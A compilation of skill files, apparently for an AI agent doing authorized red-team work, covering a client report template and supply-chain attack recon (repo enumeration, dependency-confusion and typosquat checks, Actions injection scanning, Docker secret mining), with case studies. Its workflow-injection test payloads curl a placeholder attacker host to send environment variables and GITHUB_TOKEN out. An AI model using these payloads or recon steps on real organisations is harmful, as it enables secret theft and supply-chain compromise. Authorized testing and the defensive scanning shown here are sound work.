- **`hunt-dispatch`** — Once mindset is loaded, the `/hunt` command needs a mode answer (redteam vs wapt, blackbox vs greybox) before it routes to platform-specific skills. Engagement flow: red-team mindset triggered → confirm engagement mode (`bug-bounty` vs red-team vs pentest per project memory) → invoke `/hunt` → `hunt-dispatch` loads the right cluster (M365 / SharePoint / VPN / vCenter / APK).
- **`mid-engagement-ir-detection`** — Red-team mindset says "behavior changes ARE findings"; this skill operationalizes that. Engagement flow: red-team engagement underway → baseline established at session start → response patterns shift mid-test → `mid-engagement-ir-detection` captures the SOC-patch state as a NEW finding (defensive-action observed = client capability metric). Don't dismiss it as "the bug got fixed."
- **`redteam-report-template`** — Red-team deliverable is NOT a bug-bounty report; different audience, different tone, different cadence. Engagement flow: findings collected throughout engagement → at session close, package via `redteam-report-template` (Subject / Observations / Description / Impact / Recommendation / PoC) for client-facing DOCX, not `report-writing` which is for H1/Bugcrowd/Intigriti platforms.
- **`triage-validation`** — Red-team mindset includes "don't retract too fast" — the 4 retractions from an authorized engagement were mindset failures, not validation failures. Engagement flow: every finding through `triage-validation` 7-Question Gate, but with the red-team adjustment that "exploitable only with chain" is still a finding, not a no-finding.
- **`evidence-hygiene`** — Red-team engagements often span weeks; without disciplined evidence capture the deliverable suffers. Engagement flow: red-team mindset triggered → set up `evidence-hygiene` capture cadence (screenshots, request/response dumps, timestamped logs) at session start, not at session close.


## SOURCE: hunt-skills/redteam-report-template/SKILL.md

## When to use

Use this skill for **client-deliverable** reports:
- External red-team engagements with a signed SOW
- Pentest reports going to a CISO / IT-Sec team (not a triager)
- Findings that will be reviewed by both technical and non-technical stakeholders
- Reports that need DOCX/PDF output (not just markdown / platform UI)

Do NOT use for:
- Bug-bounty platform submissions (use `report-writing` / `bugcrowd-reporting` instead)
- Quick proof-of-concept memos
- Internal team writeups

---

## The 6-section format per finding

This is the canonical structure each finding follows:

```markdown

## Finding F##: <descriptive title>

**Severity:** Critical / High / Medium / Low / Informational
**Status:** Confirmed / Patched mid-engagement / Suspected (1 signal)
**CVSS 3.1:** <score> (<vector>)
**Affected Asset:** <URL / IP / app name>

### 2. Observations
<Bulleted list of what was observed during testing. Concrete facts only — no interpretation yet.>
- <Observation 1>
- <Observation 2>
- ...

### 3. Description
<Technical explanation of the vulnerability. 2-4 paragraphs. Reader should understand WHY the observations indicate a vulnerability, what the underlying flaw is.>

### 4. Impact
<What an attacker could achieve. Concrete attacker outcomes, NOT generic CIA triad statements. Tie to the client's business — money, data, reputation, regulatory exposure.>

### 5. Recommendation
<Specific, actionable remediation. Vendor patch, configuration change, code-level fix. Avoid "implement security best practices" — say what specifically.>

### 6. Proof of Concept (PoC)
<Steps to reproduce, numbered. Include the exact HTTP requests, payloads, tools used.>

**Step 1:** <action>
```http
<full HTTP request or curl one-liner>
```

**Step 2:** <action>
```
<response excerpt>
```

**Screenshot:**
![F##_descriptive_name](screenshots/F##_descriptive_name.png)
```

---

### Severity table (client-facing — different from CVSS-only)

| Severity | Business definition | CVSS rough range |
|---|---|---|
| Critical | Direct revenue/data loss without prerequisites | 9.0-10.0 |
| High | Full account/system takeover with limited prerequisites | 7.0-8.9 |
| Medium | Significant data exposure or partial compromise | 4.0-6.9 |
| Low | Information disclosure with limited exploitation path | 0.1-3.9 |
| Informational | Hygiene finding, no immediate exploit | N/A |

### Status field (red-team-specific)

This is the field that distinguishes red-team deliverables from bug-bounty reports. Use one of:

- **Confirmed** — reproduced multiple times, with full PoC
- **Confirmed; patched mid-engagement** — was reproducible, client patched during the test window (still ship the finding — see `mid-engagement-ir-detection`)
- **Confirmed; partially reproducible** — works but needs specific conditions
- **Suspected (1 signal)** — single indicator, not confirmed (rare — usually drop)
- **Out-of-band** — finding from passive recon, not actively tested

---

### 1. Don't retract findings that stopped reproducing
If a finding was confirmed and then stopped working, that is almost always a CLIENT PATCH, not a finding-was-false. The correct response is "Confirmed; patched mid-engagement" with timestamps showing when it broke. See `mid-engagement-ir-detection`.

### 2. Don't hedge in the Impact section
Bad: "An attacker could potentially be able to access user data, which may lead to..."
Good: "An attacker reads any user's profile data. Demonstrated on test user `victim@target.com` at 14:22 IST."

### 3. Don't generic-CIA the impact
Bad: "Loss of confidentiality and integrity of customer data"
Good: "Read access to 247,000 customer records including PAN cards, addresses, GST numbers. India DPDPA Section 33 mandates 72-hour breach disclosure to DPB."

### 4. Don't list every recon finding as a finding
Recon notes (subdomains found, ports open, technologies fingerprinted) belong in a separate **Recon / Attack Surface** appendix, not the findings list. A finding must have an attacker-attainable outcome.

### 5. Don't bury the PoC
Each finding MUST have reproducible steps. The PoC section is what proves the finding to a skeptical reader. If you can't write the PoC clearly, the finding probably isn't ready to ship.

---

## Document-level structure

```
1. Executive Summary (1 page, non-technical)
   - Engagement overview (dates, scope)
   - Risk posture summary (heat-map: <X critical, Y high, Z medium...>)
   - Top 3 strategic recommendations
   - Comparison to industry baseline (optional)

2. Engagement Details
   - Scope (in-scope, out-of-scope, exclusions)
   - Methodology (recon → exploit → reporting; or align with PTES / OSSTMM)
   - Tools used
   - Timeline (start / end / key milestones)
   - Team

3. Risk Summary Table
   | F# | Title | Severity | Status |
   |----|-------|----------|--------|
   | F01 | ... | Critical | Confirmed |
   ...

4. Findings (one per ## section, in severity order — Critical first)

5. Attack Surface / Recon Appendix
   - Subdomains discovered
   - Open ports / services
   - Technology fingerprints
   - APKs found
   - Credentials in breach corpora (count + sample only — redact)
   - Identity-fabric map (IdP, MFA posture)

6. Indicators of Compromise (IoCs)
   - Source IPs used during testing (so SOC can correlate)
   - User-Agent strings
   - Test accounts created
   - Files uploaded (with cleanup status)

7. Cleanup Statement
   - Confirmation that all test artifacts (accounts, uploads, persistence) were removed
   - Outstanding cleanup items requiring client action

8. Appendices (raw output, screenshots index, full target list)
```

---

# Convert
pandoc REPORT_FINAL.md \
  -o REPORT_FINAL.docx \
  --resource-path=engagement_log/poc \
  --reference-doc=~/.claude/skills/redteam-report-template/templates/reference.docx \
  --toc \
  --toc-depth=2 \
  --highlight-style=tango

# Verify image count
python3 -c "
from docx import Document
d = Document('REPORT_FINAL.docx')
imgs = [r for r in d.part.rels.values() if 'image' in r.target_ref]
print(f'Embedded images: {len(imgs)}')
print(f'Paragraphs: {len(d.paragraphs)}')
print(f'Headings: {sum(1 for p in d.paragraphs if p.style.name.startswith(\"Heading\"))}')
"
```

### Image filename convention

```
screenshots/F<NN>_<descriptive>.png

Examples:
F01_locked_accounts.png
F02a_saml_landing.png
F02b_saml_ca_block_page.png
F03_sqli_timing_chart.png
F15_saml_metadata.png
```

Variants get letter suffixes (F02a, F02b). Always zero-pad finding number.

---

## Writing tone — for client deliverables

| Section | Tone |
|---|---|
| Subject | Plain English, jargon-free, 1 line |
| Observations | Bulleted facts, past tense ("observed that...") |
| Description | Technical but accessible; assume CISO reader |
| Impact | Business-translated; tie to revenue/regulation |
| Recommendation | Imperative, specific, actionable |
| PoC | Operator-level technical; copy-pasteable |

**Always:**
- Use past tense for observations ("The endpoint returned a 200 status code")
- Use present tense for descriptions of the flaw ("The application does not validate...")
- Use imperative for recommendations ("Apply patch ... by ...")
- Number reproduction steps; never "first... then... also..."

**Never:**
- "Could potentially" — prove it or drop it
- "It might be possible" — same
- "We recommend implementing security best practices" — say which one specifically
- "The application is vulnerable to..." without saying what specifically

---

## Audience translation — same finding, different framing

Example: hardcoded JWT in APK

| Section | Technical framing | CISO framing | Board framing |
|---|---|---|---|
| Impact | "JWT signing key extracted from APK enables forging admin tokens" | "Anyone with the customer-facing mobile app can read any customer's invoice" | "A leaked secret in our mobile app lets attackers impersonate users" |

The same finding's Impact paragraph should cover both ends — start with the business outcome, then drop into technical detail.

---

## Findings that are sometimes wrongly excluded

Red-team deliverables should include — not just bug-bounty payable bugs:

- **Information disclosure that helps attack mapping** (CodeIgniter debug toolbar leaking routes, version banners on appliances) — Medium
- **User enumeration** (Microsoft OneDrive 302 vs 404 differential) — Medium
- **Pre-existing security state observations** (247 accounts already locked by external attacker; weak password policies) — Informational with stakeholder relevance
- **Defensive observations** (SOC patched our SQLi within 30 min — evidence of working detection) — Informational/positive
- **Sister-app pattern issues** (same code template across 7 apps) — Medium (multiplied blast radius)

Bug bounty would reject most of these. Red-team deliverables embrace them — the client paid for the assessment to know.

---

## Mid-engagement events to document

Beyond findings themselves, the deliverable should include:

- Detected SOC responses (timestamps when defenses kicked in)
- Concurrent external attacker activity (if any was observed)
- Findings the client patched during the engagement (with PoC pre-patch as evidence)
- Tooling failures (e.g., MCP timeout, CAPTCHA not solvable) — these affect what was/wasn't testable

Each gives the client context about their real-world detection capability, which often matters more than the findings themselves.

---

## Template library (where to put canned text)

Maintain reusable boilerplate in:
```
~/.claude/skills/redteam-report-template/templates/
    executive_summary.md      # Reusable exec summary skeleton
    methodology.md            # Standard methodology section
    cleanup_statement.md      # Standard cleanup language
    reference.docx            # Pandoc style template (fonts, headings, colors)
    cover.docx                # Cover page template
```

Don't write these from scratch each engagement; clone and customize.

---

## Quality checks before delivery

Pre-delivery checklist:

- [ ] Every finding has all 6 sections populated (no "TBD")
- [ ] Every finding has at least one screenshot or HTTP-level evidence
- [ ] Every PoC includes redactions for client PII (mask emails, phone numbers, IDs)
- [ ] Every screenshot is referenced in the MD with a relative path that resolves
- [ ] DOCX render check — image count matches MD reference count
- [ ] Severity ordering: Critical findings first, then High, etc.
- [ ] Executive summary is updated to match final findings (count, themes)
- [ ] Cleanup statement explicitly says what was created and what was removed
- [ ] IoC section enables the SOC to reconstruct what they saw
- [ ] Spell-check (especially client company name, product names)
- [ ] All tool versions noted in methodology
- [ ] Status field set correctly on every finding (especially patched-mid-engagement)

---

## Bridge to neighboring skills

- `report-writing` — bug-bounty platform reports (different format, different audience)
- `redteam-mindset` — informs what counts as a finding worth shipping
- `mid-engagement-ir-detection` — informs the "patched mid-engagement" status pattern
- `evidence-hygiene` — informs screenshot redaction discipline
- `m365-entra-attack`, `enterprise-vpn-attack`, etc. — each provides finding-templates specific to its attack surface

---

## Anti-patterns

- **DO NOT** write a 50-page report for 3 findings — pad-by-page erodes credibility
- **DO NOT** use the same severity for everything — calibrate
- **DO NOT** copy-paste OWASP top-10 boilerplate into Description sections
- **DO NOT** include findings without PoCs — they read as speculative
- **DO NOT** skip the Recommendation section's specificity — "patch and review" doesn't help
- **DO NOT** mix bug-bounty CVSS scoring with red-team severity unthinkingly — context differs (e.g., a Medium on a CVSS basis can be Critical for the client if it touches a regulated dataset)

---

## Real engagement metric (authorized-engagement)

For calibration:
- 14 findings shipped (2 Critical, 4 High, 5 Medium, 3 Low/Info)
- 18 screenshots embedded
- 52,737 bytes markdown / 2,262,484 bytes DOCX
- 414 paragraphs, 123 headings in DOCX
- 16 inline images (2 were inline in MD-only edge cases)
- Time-to-deliverable: ~6 hours after engagement close for first draft

These numbers are typical for a 1-week external red-team engagement on a mid-size enterprise. Scale down for short tests, up for full purple-team exercises.

---

## Related Skills & Chains

- **`triage-validation`** — This template ingests findings that have ALREADY passed the 7-Question Gate. Engagement flow: every finding through `triage-validation` first → only validated findings → `redteam-report-template` packaging. Skipping triage produces a deliverable padded with informational noise that erodes client trust.
- **`evidence-hygiene`** — The DOCX with 16 embedded screenshots only works if evidence was captured systematically throughout the engagement. Engagement flow: `evidence-hygiene` discipline at session start → timestamped, organized screenshot folder → `redteam-report-template` consumes that folder to populate Evidence blocks.
- **`redteam-mindset`** — The Subject / Observations / Description / Impact / Recommendation / PoC structure assumes the operator already thinks like a red-teamer (impact-first, blast-radius framing). Engagement flow: `redteam-mindset` loaded at engagement start → findings collected with red-team framing baked in → `redteam-report-template` produces deliverable without rewriting every Impact section.
- **`mid-engagement-ir-detection`** — Defensive-action findings (SOC patches mid-test, new IPS rules deployed, account lockouts triggered by external attacker) are first-class findings in red-team deliverables. Engagement flow: `mid-engagement-ir-detection` captures behavior-change events → each becomes its own Subject in the deliverable, framed as "client capability observation" not as "bug we missed."
- **`report-writing`** + **`bugcrowd-reporting`** — Bug-bounty platform reports use DIFFERENT structure (one finding per submission, platform-specific severity scoring, OOS-clause counters). Engagement flow: if engagement mode is `bug-bounty` per project memory → use `report-writing` / `bugcrowd-reporting` instead. This template is ONLY for external red-team / enterprise client deliverables.


## SOURCE: hunt-skills/supply-chain-attack-recon/SKILL.md

## When to use

Trigger when:
- Target has a public GitHub organization (find via OSINT)
- JS bundles reference internal-looking package names (`@target-internal/...`, `target-utils`, `target-shared`)
- Build logs, SBOMs, or `package-lock.json` files are publicly accessible
- Target uses CI/CD that's partially public (GitHub Actions, GitLab CI, Bitrise)
- Docker images on Docker Hub/GHCR/Quay belong to target org
- Findings include `npmrc`/`pip.conf`/`gradle.properties` with internal registry URLs
- `.github/workflows/*.yml` files reference internal tooling

Do NOT use for:
- Internal-network artifact registries (out of scope per external boundary)
- Actually publishing typosquats / dep-confusion packages without explicit OK
- Compromising upstream open-source projects (massive blast radius — illegal in most jurisdictions without authorization)

---

## The supply-chain attack surface map

```
Target Org
├── Public GitHub Org → workflow files → secrets exfil opportunities
├── Internal package names in JS/Android bundles → dependency confusion
├── Docker images on public registries → secrets in layers, RCE on pull
├── SBOM / artifact metadata → exact dep versions for known-vuln chaining
├── npmrc / pip.conf in repos → internal registry URL disclosure
├── External package dependencies → typosquat name candidates
└── Build/release pipelines → injection if pull_request_target etc.
```

---

## Step 1 — GitHub org discovery

```bash
TARGET="<brand>"  # set to target brand name

# Direct guesses
for guess in $TARGET "${TARGET}-tech" "${TARGET}corp" "${TARGET}-io" "${TARGET}-eng"; do
  curl -sI "https://github.com/$guess" | grep -E "HTTP|status" | head -1
done

# Via WHOIS / email-domain → GitHub search
gh search users --owner-affiliations=organization --query "$TARGET" --limit 10

## Step 2 — Enumerate public repos for sensitive artifacts

```bash
ORG="targetorg"

# List public repos
gh repo list "$ORG" --limit 100 --json name,description,visibility,defaultBranchRef

# Look for high-signal repo names
gh repo list "$ORG" --limit 100 --json name | jq -r '.[].name' | grep -iE "internal|infra|deploy|config|secret|setup|sdk|api"

# JS bundles are the easiest source of internal npm names
curl -sk https://target.com/main.js | grep -oE '@[a-z-]+/[a-z-]+' | sort -u
curl -sk https://target.com/main.js | grep -oE 'require\("[^"]+"\)' | sort -u

# Look for scoped names that are NOT public on npm
for pkg in @target/utils @target-internal/api @companybrand/sdk; do
  status=$(curl -sI "https://registry.npmjs.org/$pkg" | head -1 | awk '{print $2}')
  echo "  $pkg → $status"
  # 404 → name unclaimed on public npm → DEPENDENCY-CONFUSION CANDIDATE
done
```

# Public repos with package.json that reference internal scopes
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  pkg=$(gh api "repos/$ORG/$repo/contents/package.json" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
  echo "$pkg" | jq -r '.dependencies // {} | keys[]' 2>/dev/null | grep -E '^@[a-z-]+/'
done | sort -u
```

# Internal pip package names
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  gh api "repos/$ORG/$repo/contents/requirements.txt" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null
done | sort -u | grep -vE '^(requests|django|flask|numpy|pandas|...common)'
```

---

## Step 4 — Dependency-confusion vulnerability check

For each internal-looking package name discovered:

```bash
NAME="@target-internal/utils"   # example

# pypi check (no scopes, just name)
NAME="target_utils"
curl -sI "https://pypi.org/project/$NAME/" | head -1

# Check if module path is reachable
curl -sI "https://proxy.golang.org/github.com/$ORG/$NAME/@latest" | head -1
```

**Severity calibration:** Just because a name is unclaimed doesn't mean it's exploitable. You also need:
1. Evidence the target's BUILD SYSTEM resolves names from public registries (not just their internal one)
2. OR evidence the target's package manager is configured insecurely (e.g., `.npmrc` without `@scope:registry=` mapping)
3. OR the package would be installed by their builds (it's actually in package.json, not just referenced in dead code)

A 404 on registry without supporting context is INFORMATIONAL only.

---

## Step 5 — Typosquat candidates (around external dependencies)

For each external public dependency the target uses:

```bash

# Generate candidates
python3 -c "
import sys
name='react-router-dom'
for i in range(len(name)):
    print(name[:i] + name[i+1:])   # delete
    if i < len(name)-1:
        print(name[:i] + name[i+1] + name[i] + name[i+2:])  # transpose
"

# Check which candidates are UNCLAIMED on the registry
for candidate in ...; do
  status=$(curl -sI "https://registry.npmjs.org/$candidate" | head -1 | awk '{print $2}')
  [ "$status" = "404" ] && echo "  UNCLAIMED: $candidate"
done
```

**⚠ EXTERNAL-OFFENSIVE NOTE:** publishing a typosquat package to a public registry is an attack on the wider ecosystem. NEVER do this without explicit, written, scope-clarified sign-off. It can affect users outside your engagement and may be illegal.

---

## Step 6 — GitHub Actions workflow injection scan

For each public repo with `.github/workflows/`:

```bash
for repo in $(gh repo list "$ORG" --limit 50 --json name --jq '.[].name'); do
  workflows=$(gh api "repos/$ORG/$repo/contents/.github/workflows" --jq '.[].name' 2>/dev/null)
  for wf in $workflows; do
    content=$(gh api "repos/$ORG/$repo/contents/.github/workflows/$wf" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null)
    echo "=== $repo/$wf ==="
    
    # High-risk patterns:
    # 1. pull_request_target (runs with secrets on PR from forks)
    echo "$content" | grep -E 'pull_request_target'
    
    # 2. Untrusted context interpolation
    echo "$content" | grep -E '\$\{\{[^}]*github\.(event|head_ref|pull_request)[^}]*\}\}'
    
    # 3. ${{ github.event.* }} into shell run blocks
    echo "$content" | grep -B1 -A2 'run:' | grep -E '\$\{\{ ?github\.event\.'
    
    # 4. checkout of PR head with elevated perms
    echo "$content" | grep -E 'ref:.*pull_request|head_ref'
    
    # 5. Self-hosted runner without isolation
    echo "$content" | grep -E 'runs-on:.*self-hosted'

    # 6. Unpinned third-party actions — mutable tag (@v1, @main) vs pinned (@<40-char sha>)
    #    Mutable tags can be repointed by a compromised action repo (see case #9, tj-actions/changed-files).
    echo "$content" | grep -E 'uses: *[^ ]+/[^ ]+@(v?[0-9]+([.][0-9]+)*|main|master|latest)\b' | grep -v '@[0-9a-f]\{40\}'
  done
done
```

### Injection patterns to flag (severity guide)

| Pattern | Severity |
|---|---|
| `pull_request_target` + `actions/checkout` with `ref: pull_request.head.sha` + uses repo secrets | **Critical** — RCE on runner with org secrets |
| `${{ github.event.pull_request.title }}` interpolated into shell | **Critical** — script injection via PR title |
| Third-party action pinned to a mutable tag (`uses: org/repo@v1` / `@main`) instead of a commit SHA | **High** — repointable supply-chain vector (see case #9) |
| Self-hosted runner reachable from public repo workflows | **High** — persistent attacker pivot |
| Issue-comment-triggered workflow that runs `gh` with token | **High** |
| Workflow downloads from URL that target controls | **Medium** |

### GitHub Actions context injection sinks (branch name, PR title, issue body)

Untrusted context flowing from PR metadata into `run:` blocks is a classic injection vector. Test payloads:

```bash

# Malicious branch name (test in a fork PR):
git checkout -b 'feat/x"; curl https://attacker/?d=$(env | base64);"'
git push origin 'feat/x"; curl https://attacker/?d=$(env | base64);"'

# Malicious PR title (create a test PR with this title):
PR_TITLE='x"; curl https://attacker/?d=$(echo $GITHUB_TOKEN | base64);"'

# Malicious issue body:
ISSUE_BODY='x"; curl https://attacker/?leak=$(git config user.name);"'

# Then watch workflow logs. If the injected commands execute, secrets are exfil'd.
```

### Public GitHub Actions run logs (leaks secrets)

Actions logs are public by default on public repos. Look for:

```bash

# List all Action runs for a repo
gh api repos/OWNER/REPO/actions/runs --jq '.workflow_runs[] | {id, name, head_branch, status, conclusion}'

# Fetch logs from a run
gh api repos/OWNER/REPO/actions/runs/<id>/logs --jq '.logs' | base64 -d

# Search logs for common leakage patterns
gh api repos/OWNER/REPO/actions/runs/<id>/logs | grep -iE 'token|key|secret|password|credential|aws_'
```

Leaked secrets in logs = direct credential exfil; severity depends on the token type (GitHub PAT, npm token, AWS key, etc.).

### Static detection of Actions injection sinks with zizmor

For high-confidence automated flagging, run the `zizmor` analyzer on all workflow files:

```bash

# Install zizmor (Rust-based, from https://github.com/woodruffw/zizmor)
cargo install zizmor

# Output includes: pull_request_target, mutable-tag uses, context interpolation, etc.

# Sort findings by risk tier
```

Zizmor saves manual regex work and catches edge cases (e.g., indirect context interpolation via variable references).

---

# Docker Hub
curl -s "https://hub.docker.com/v2/repositories/$ORG/?page_size=100" | jq -r '.results[].name'

# GHCR (GitHub Container Registry) — public images visible in repo packages tab
gh api "users/$ORG/packages?package_type=container" 2>/dev/null
gh api "orgs/$ORG/packages?package_type=container" 2>/dev/null

# For each image, list tags
for img in image1 image2; do
  curl -s "https://hub.docker.com/v2/repositories/$ORG/$img/tags?page_size=20" | jq -r '.results[].name'
done

# Pull and inspect layers
docker pull "$ORG/$img:latest"
docker history --no-trunc "$ORG/$img:latest"

# Mine layers for secrets
docker save "$ORG/$img:latest" -o /tmp/image.tar
mkdir -p /tmp/img && tar -xf /tmp/image.tar -C /tmp/img
find /tmp/img -name "*.tar*" -exec tar -xf {} -C /tmp/img/extracted \;

# Then run gitleaks / trufflehog over extracted filesystem
trufflehog filesystem /tmp/img/extracted --no-update
```

---

# Look for SBOMs published as releases (SPDX, CycloneDX format)
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("sbom|cyclonedx|spdx"; "i")) | .browser_download_url'

# JSON dependency lockfiles in releases
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("lock|deps"; "i")) | .browser_download_url'

# Compare versions to nuclei nvd templates or osv.dev for known vulns
curl -s "https://api.osv.dev/v1/query" -d '{"package": {"name": "lodash", "ecosystem": "npm"}, "version": "4.17.10"}'
```

---

# .npmrc patterns
grep -r "registry=" .                                            # in cloned repos
grep -r "_authToken=" .                                          # leaked npm token!
grep -r "@.*registry=" .                                          # scoped registry

# Each leaked internal URL is intel — flag the URL itself even if not directly exploitable
```

---

# Some orgs maintain a public npm scope mirroring their brand
curl -s "https://registry.npmjs.org/-/v1/search?text=scope:$ORG&size=50" | jq '.objects[].package.name'

# Public PyPI presence
curl -s "https://pypi.org/simple/" | grep "$ORG" | head -20

# (relevant for any internal package using that scope)
curl -sI "https://registry.npmjs.org/-/org/$ORG"
```

---

### Compromised CDN detection (polyfill.io, etc.)

Known-compromised CDNs and analytics services have been weaponized. Check target's public HTML/JS:

```bash

# Detect usage of polyfill.io and similar historically-compromised services
curl -s https://target.com | grep -i polyfill
curl -s https://target.com | grep -iE '(polyfill\.io|cdn\.jsdelivr\.net.*polyfill|babel\.min\.js)'

# Check JavaScript bundles
for bundle in public/*.js main.*.js app.*.js; do
  grep -i polyfill "$bundle" && echo "FOUND: $bundle"
done
```

Reference: polyfill.io was compromised in 2024 to serve malicious payloads. Presence = supply-chain risk.

---

## Tooling

| Tool | Purpose |
|---|---|
| **`trufflehog`** | Filesystem/git/docker secret scan |
| **`gitleaks`** | Git history secret scan |
| **`dependency-confusion`** (Confused) | npm scope/PyPI checks |
| **`packj`** | Package risk score (PyPI/npm/RubyGems) |
| **`Lift / Snyk vuln-db`** | Known CVE lookup by package version |
| **`actionlint`** | GitHub Actions static analyzer |
| **`zizmor`** | GitHub Actions injection & security antipattern detection |
| **`OSSGadget`** | Microsoft's package metadata toolkit |
| **`semgrep`** + supply-chain rules | Workflow injection detection |
| **`osv-scanner`** | Match versions to known vulns |

---

## Severity scoring guidance

| Finding | Severity |
|---|---|
| Internal package name + no scope-mapping + unclaimed on public npm + actively in builds | **Critical** — Dep-confusion RCE |
| Internal package name + scope-mapping in `.npmrc` but `_authToken` leaked | **Critical** — direct registry push |
| Pull_request_target workflow + secrets exposed + PR-controlled code execution | **Critical** — Org-wide token theft |
| Docker image with leaked secret in layer | **High** (varies by secret) |
| Internal registry URL disclosed (but no creds) | **Low** — Info-disc only |
| Typosquat candidate identified (not published) | **Informational** — Awareness item |
| Public org has 1000+ unused names that COULD be claimed | **Informational** — Hygiene |

---

## Anti-patterns

- **DO NOT publish a typosquat / dep-confusion package without explicit, signed, scope-clarified authorization** — this affects users outside the engagement
- **DO NOT submit PRs to client repos as part of testing without specific OK** — workflow injection PoCs may be needed but they touch CI/CD and other developers
- **DO NOT scrape entire npm/PyPI for typosquat candidates** — irresponsible and noisy
- **DO NOT confuse "name is unclaimed" with "exploitable dependency confusion"** — the build system matters; many orgs use proper scope-mapping that prevents the attack
- **DO NOT touch GitHub Actions self-hosted runners** — they may be inside the client network and outside the external scope
- **DO NOT pull large Docker images blindly** — image bandwidth can be 5-50GB; review tags first

---

## What constitutes a deliverable finding

A supply-chain finding needs ALL of:
1. **Concrete name/path** — exact internal package name, exact workflow file path, exact image tag
2. **Vulnerability mechanism** — dep-confusion / typosquat / injection / etc.
3. **Exploitability evidence** — proof the build/install would actually use the attacker's payload (not just "name is unclaimed")
4. **Severity** — calibrated to blast radius (one developer? all developers? all users of the package?)
5. **Recommendation** — specific (e.g., "register the unused name @target-internal/utils on npm AS YOUR OWN even if unused; configure `.npmrc` scope:registry mapping")

---

## Bridge to neighboring skills

- `apk-redteam-pipeline` — APKs reveal internal package names too (find them in decompiled `build.gradle`)
- `cloud-iam-deep` — CI/CD secrets often = cloud credentials; this skill finds them, that skill validates them
- `hunt-cloud-misconfig` — CI/CD pipeline misconfig (Jenkins / GitLab Runner) overlap
- `m365-entra-attack` — Azure DevOps pipelines are part of Entra surface
- `redteam-report-template` — supply-chain findings need extra clarity on blast radius (one repo vs whole ecosystem)
- `mid-engagement-ir-detection` — registering a name on public npm triggers nothing inside the client, but ANY publish action is loud and audit-trailed

---

## External-only boundary check

This skill is squarely external — all targets are public registries / public GitHub. If the engagement involves the client's internal artifact registry (internal Nexus, JFrog, Sonatype), that is internal infrastructure and OUT OF SCOPE per `feedback_skill_boundaries`. Report internal-registry URL exposure as a finding; do not attempt to enumerate it.

---

## Real-world references

- **Alex Birsan 2021** — Original dependency-confusion research, $130K+ in bounties from Apple/Microsoft/PayPal/Yelp/etc.
- **ua-parser-js 2021** — npm package compromise via stolen maintainer credentials
- **node-ipc 2022** — Maintainer-introduced supply-chain malicious update
- **3CX 2023** — Cascading supply-chain attack via X_TRADER → 3CX → customers
- **XZ Utils 2024** — Multi-year social-engineering supply-chain attack on upstream OSS

Each of these is worth reading for what made the attack effective and what red flags existed earlier.

---

## Disclosed-case catalogue (citations)

Twelve well-documented public cases, mapped to the recon surface above. Each entry: attack name, year, flow, root cause, impact, references, and the recon-skill takeaway.

### 1. SolarWinds Orion / SUNBURST (CISA AA20-352A, Dec 2020)

- **Flow:** APT29 (UNC2452 / Cozy Bear) breached SolarWinds' build pipeline and inserted the SUNBURST backdoor into `SolarWinds.Orion.Core.BusinessLayer.dll`. The trojanized DLL was code-signed with SolarWinds' legitimate certificate and shipped to ~18,000 customers via the normal auto-update channel between March and June 2020.
- **Root cause:** Build-environment compromise — attackers modified source mid-compilation; signing infrastructure trusted the build output without verifying source integrity.
- **Impact:** ~18,000 organisations received the backdoor; ~100 (incl. US Treasury, Commerce, DHS, DoJ, Microsoft, FireEye/Mandiant) received the SECOND-stage TEARDROP/BEACON payload. SolarWinds reported >$40M in direct response costs; class-action settlement $26M.
- **References:**
  - CISA AA20-352A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a
  - Mandiant write-up (SUNBURST): https://cloud.google.com/blog/topics/threat-intelligence/sunburst-additional-technical-details
  - Microsoft analysis: https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack/
  - SolarWinds post-mortem: https://orangematter.solarwinds.com/2021/01/11/new-findings-from-our-investigation-of-sunburst/
- **Recon takeaway:** Whenever a target ships signed binaries from their own CI, the recon check is: is the build environment itself reachable? Look for exposed Jenkins/GitLab CI consoles, public TeamCity agents, or build artefacts that leak source paths. A code-signing cert plus a compromised build = unstoppable trust chain.

### 2. 3CX VoIP softphone supply chain (CVE-2023-29059, March 2023)

- **Flow:** DPRK-attributed Lazarus subgroup (UNC4736 / Labyrinth Chollima) trojanized the 3CX DesktopApp (Electron-based softphone) on both Windows and macOS. Initial entry was via a PREVIOUS supply-chain attack — an employee installed a backdoored copy of Trading Technologies' X_TRADER, the FIRST disclosed cascading supply-chain compromise (one supply-chain victim becomes another's vector).
- **Root cause:** Dev workstation compromise → access to 3CX source/build pipeline → malicious `ffmpeg.dll` and `d3dcompiler_47.dll` shipped in signed installer.
- **Impact:** ~600,000 organisations use 3CX; tens of thousands of trojanized clients downloaded. Lazarus selectively activated second-stage payloads against cryptocurrency and trading firms.
- **References:**
  - CrowdStrike: https://www.crowdstrike.com/en-us/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/
  - SentinelOne: https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/
  - Mandiant cascading attack analysis: https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise
  - 3CX post-mortem: https://www.3cx.com/blog/news/desktopapp-security-alert-update/
- **Recon takeaway:** Cascading supply chain is real — your target's vendors' vendors matter. When recon enumerates "what software does this org install on engineer laptops," each one is itself a supply-chain target. Electron apps (signed JS bundles) are especially common vectors.

### 3. MOVEit Transfer mass exploitation (CVE-2023-34362, May–July 2023)

- **Flow:** Cl0p ransomware affiliate (FIN11 / Lace Tempest) discovered an unauthenticated SQLi in Progress MOVEit Transfer, deployed the LEMURLOOT webshell, and exfiltrated files from every internet-reachable instance over a ~2-week window before the patch dropped on 31 May 2023.
- **Root cause:** Pre-auth SQLi in `moveitisapi/moveitisapi.dll` → arbitrary SQL → write webshell via `xp_cmdshell`-equivalent path. Classic single-CVE-mass-exploitation; not a build-pipeline attack but a SHIPPED-CODE supply-chain failure.
- **Impact:** ~2,700 organisations confirmed compromised, ~95 million individuals' PII leaked (BBC, Shell, BA, US DoE, Louisiana OMV, Oregon DMV, etc.). Estimated losses >$15B aggregated.
- **References:**
